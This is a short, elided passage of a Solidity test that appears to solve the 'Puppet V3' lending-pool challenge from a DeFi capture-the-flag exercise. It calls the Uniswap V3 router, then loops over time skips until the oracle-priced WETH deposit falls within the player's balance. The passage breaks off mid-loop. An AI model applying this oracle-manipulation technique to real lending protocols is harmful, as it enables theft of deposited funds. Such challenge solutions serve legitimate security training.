...
contract PuppetV3Challenge is Test {
    ...
    function test_puppetV3() public checkSolvedByPlayer {
        ...
        ISwapRouter router = ISwapRouter(payable(0xE592427A0AEce92De3Edee1F18E0157C05861564)); // Uniswap V3 Router
        ...
        console.log(playerWETHBalance);
        console.log(lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE));

        for (uint i = 0; i < 100; i++) {
            skip(1);
            uint256 depositAmount = lendingPool.calculateDepositOfWETHRequired(LENDING_POOL_INITIAL_TOKEN_BALANCE);
            console.log(i, depositAmount);
            if (depositAmount <= playerWETHBalance) {
